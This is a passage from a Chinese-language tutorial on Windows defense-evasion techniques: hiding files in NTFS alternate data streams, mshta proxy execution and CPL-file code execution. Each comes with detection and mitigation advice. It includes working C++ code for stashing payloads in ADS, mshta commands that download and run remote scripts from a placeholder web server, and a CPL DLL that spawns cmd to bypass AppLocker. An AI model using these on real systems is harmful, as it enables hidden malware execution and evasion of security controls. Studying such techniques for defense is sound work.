Table），这个表结构中保存了该分区上每个文件及目录的相关信息。在MFT结构中还保存着文件属性， 如 Extended Attributes (EA) 及
Data(当存在多个数据属性时称为Alternate Data Streams
，交换数据流，即ADS)，而用户可以为文件新建交换数据流，并将存储任意二进制数据在其中，如将完整的文件在其中，而在Windows系统的资源管理器中，
**载体文件不会有任何变化（如文件大小、时间戳）** ，攻击者完全可以利用该特性将 **完整的文件隐藏在交换流** 中。
ADS的应用，这里笔者将举个简单的例子进行说明， 相信读者有通过Internet
Explorer下载过可执行文件，然后在运行的时候收到如下图所示的警告，这是其实就是ADS的运用。
在文件下载完成后， IE会在文件上加入一个ADS。该ADS将存储一个标签，以便Windows了解文件是从哪个区域下载的。
可以通过Powershell和stream.exe（sysinternals工具包中有提供）来操作（ **新增** 、 **查看** 、 **修改、删除**
）文件中的ADS，用如下的命令查看
该文件是经IE下载的，其存在一个名为“Zone.Identfier”的流，其中保存了文件是从IE下载的标示，我们通过将文件复制到真机，再拖回虚拟机再看一下，可以看到同样的文件，其附加的属性已经不存在。
ADS的操作也可以通过CMD命令进行操作，其操作方法如下：
    :
如使用echo命令创建并写入数据到ADS中：
    echo for test > sc.dat:stream
可见的是，文件大小为0。使用stream.exe可以看到存在一个名为stream的交换流
攻击者可能会将恶意数据或者二进制文件存储在文件的备用流（ADS）中，而不是直接存储在文件中，这种技术可用于 **文件隐藏** 、 **防病毒软件静态扫描**
、 **主机取证分析** 等安全手段的 **绕过** 。
如下的代码演示在ADS中隐藏完整的文件及存取等操作。
    bool set_ads(TCHAR* host_file,TCHAR* payload_filepath)
    {
        bool ret = false;
        BYTE read_buf[0x1000];
        DWORD read_cb, write_cb;
        TCHAR finalpath_buf[MAX_PATH * 2];
        HANDLE final_handle = INVALID_HANDLE_VALUE;
        HANDLE payload_handle = INVALID_HANDLE_VALUE;
        wsprintf(finalpath_buf, _TEXT("%s:stream_name"), host_file);
        final_handle = CreateFile(finalpath_buf, FILE_ALL_ACCESS,
            FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (final_handle == INVALID_HANDLE_VALUE)
        {
            goto SAFE_EXIT;
        }
        payload_handle = CreateFile(payload_filepath, FILE_READ_ACCESS,
            FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (payload_handle == INVALID_HANDLE_VALUE)
        {
            goto SAFE_EXIT;
        }
        do 
        {
            if (!ReadFile(payload_handle, read_buf, 0x1000, &read_cb, NULL))
            {
                goto SAFE_EXIT;
            }
            if (!WriteFile(final_handle, read_buf, read_cb, &write_cb, NULL) && write_cb != read_cb)
            {
                goto SAFE_EXIT;
            }
            if (read_cb != 0x1000)
            {
                break;
            }
        } while (true);
        ret = true;
    SAFE_EXIT:
        if (final_handle != INVALID_HANDLE_VALUE)
        {
            CloseHandle(final_handle);
        }
        if (payload_handle != INVALID_HANDLE_VALUE)
        {
            CloseHandle(payload_handle);
        }
        return ret;
    }
    bool read_ads(TCHAR* host_path, TCHAR* stream_name, TCHAR* save_path)
    {
        bool ret = false;
        BYTE read_buf[0x1000];
        DWORD read_cb, write_cb;
        TCHAR finalpath_buf[MAX_PATH * 2];
        HANDLE stream_handle = INVALID_HANDLE_VALUE;
        HANDLE save_handle = INVALID_HANDLE_VALUE;
        wsprintf(finalpath_buf, _TEXT("%s:%s"), host_path, stream_name);
        stream_handle = CreateFile(finalpath_buf, FILE_ALL_ACCESS,
            FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (stream_handle == INVALID_HANDLE_VALUE)
        {
            goto SAFE_EXIT;
        }
        save_handle = CreateFile(save_path, FILE_WRITE_ACCESS,
            FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (save_handle == INVALID_HANDLE_VALUE)
        {
            goto SAFE_EXIT;
        }
        do 
        {
            if (!ReadFile(stream_handle, read_buf, 0x1000, &read_cb, NULL))
            {
                goto SAFE_EXIT;
            }
            if (!WriteFile(save_handle, read_buf, read_cb, &write_cb, NULL) && write_cb != read_cb)
            {
                goto SAFE_EXIT;
            }
            if (read_cb != 0x1000)
            {
                break;
            }
        } while (true);
        ret = true;
    SAFE_EXIT:
        if (stream_handle != INVALID_HANDLE_VALUE)
        {
            CloseHandle(stream_handle);
        }
        if (save_handle != INVALID_HANDLE_VALUE)
        {
            CloseHandle(save_handle);
        }
        return ret;
    }
    int _tmain(int argc, _TCHAR* argv[])
    {
        if(set_ads(_TEXT("c:\\windows\\tasks\\sc.dat"), _TEXT("help.txt")))
        {
            _tprintf(_TEXT("set fail!!!\r\n"));
        }
        if(read_ads(_TEXT("c:\\windows\\tasks\\sc.dat"),_TEXT("stream_name"), _TEXT("help_fromads.txt")))
        {
            _tprintf(_TEXT("read fail!!!\r\n"));
        }
        return 0;
    }
#### 检查及限制方案
  1. 通过dir /r命令可以显示目录中含有ADS的文件，在找到不合法的交换流后删除掉即可。
  2. 通过Sysinternals提供的Streams工具来查询文件是否具有ADS，同时可以用该工具删除
  3. 使用Powershell命令来与ADS交换和操作，如 **Get-Item** ， **Set-Item** ， **Remove-Item** 和 **Get-ChildItem** .
#### 参考链接
  1. Att&ck：
  2. Microsoft ADS：
### 11、Mshta代理执行脚本代码
#### 原理及代码介绍
Mshta.exe 是执行Microsoft HTML
应用程序（HTA）的内置工具，在Windows系统中默认自带该工具。HTA文件的扩展名为“.hta”, HTA是独立的应用程序，他们使用与Internet
Explorer相同的模型和技术执行，但是并不通过浏览器进行执行，而在浏览器之外。
攻击者可以通过制作恶意HTA文件（如带有恶意 **Javascript** 或 **VBScript**
代码执行）并调用Mshta.exe执行以绕过系统或是 **反病毒软件** 提供的 **应用程序白名单检测** 、 **数字证书验证** 等安全检查。
可以直接调用Mshta.exe并传递脚本代码进行执行：
    mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
也可以调用Mshta并传递hta文件URL进行下载执行：
    mshta http[:]//webserver/payload[.]hta
通过Mshta.exe代理执行脚本代码，可以用于 **绕过** 没有阻止其执行的 **应用程序白名单限制** 解决方案，由于mshta在Internet
Explorer的安全上下文之外执行，因此它也绕过了浏览器安全设置。
下面将分别列举攻击者的2种利用手段：
1、 mshta直接执行脚本代码
    mshta about:””
在本地搭建http服务器将test.vbs加载进去
执行CMD命令启动mshta
2、 mshta执行hta脚本文件
构建如下的HTA脚本，其中引用外部的脚本文件
    执行情况如下
#### 检查及限制方案
##### 检查方法：
  1. 使用进程监视工具来监视mshta.exe的执行和参数。
  2. 在命令行中寻找执行原始脚本或混淆脚本的mshta.exe。
  3. 将mshta.exe的最近调用与已知良好参数的历史执行记录进行对比，已确定异常和潜在的对抗活动。
##### 缓解方案：
  1. 如果在特定环境中mshta.exe不是必须的， 可以考虑删除或者禁用该组件。
  2. 修改系统配置或者杀软配置，阻止mshta.exe的执行，或者将该文件移除出应用程序白名单，以防止被潜在的攻击者滥用行为。
#### 参考链接
  1. Att&ck：
  2. Introduction to HTML Applications (HTAs):[]
### 12、控制面板文件代码执行
#### 原理及代码介绍
控制面板的每一项一般都会对应一个.CPL
文件,这些文件存于系统目录下,你可以指定控制面板中要显示的项目,也可以隐藏。当启动控制面板时，Windows\System 文件夹中的.cpl
文件会自动加载。
以“.CPL”扩展名结尾的文件其实是“.dll”文件，用IDA打开可以发现CPL文件都导出了一个CPLApplet函数。
函数CPLApplet是控制面板应用程序的入口点，它被控制面板管理程序自动调用，并且是个回调函数，注意：CPL文件一定要把函数CPLApplet导出，这样控制面板才能找到程序的入口点。
当启动控制面板时，它会搜索Windows或System32或注册表的相应条目目录下的文件，并把以CPL作为扩展名的文件载入，它调用CPL文件的导出函数CPLApplet（），发送消息给该函数。所以，控制面板应用程序要处理控制面板发送过来的消息，即在函数CPLApplet中进行处理，该函数没有默认的行为。如果一个CPL文件中实现了多个控制面板程序，那么只会有一个CPLApplet函数，它负责所有的控制面板应用程序。
开启默认规则后会拦截exe和脚本的执行，并没有限制CPL文件，因此可以绕过Windows AppLocker的限制规则。当然也可以绕过一些应用程序白名单
Cpl文件按照dll文件的编写就行，如果只是简单的运行cmd，可以不导出函数CPLApplet。
    extern "C" __declspec(dllexport) LONG CPLApplet(HWND hwndCPl, UINT msg, LPARAM lParam1, LPARAM lParam2)
    {
         return 0;
    }
    BOOL APIENTRY DllMain( HMODULE hModule,
                DWORD ul_reason_for_call,
                LPVOID lpReserved
               )
    {
      switch (ul_reason_for_call)
      {
      case DLL_PROCESS_ATTACH:
              WinExec("cmd", SW_SHOW);
      case DLL_THREAD_ATTACH:
      case DLL_THREAD_DETACH:
      case DLL_PROCESS_DETACH:
        break;
      }
      return TRUE;
    }
编译成功后，将dll后缀名改成cpl，并修改注册表项
    HKEY hKey;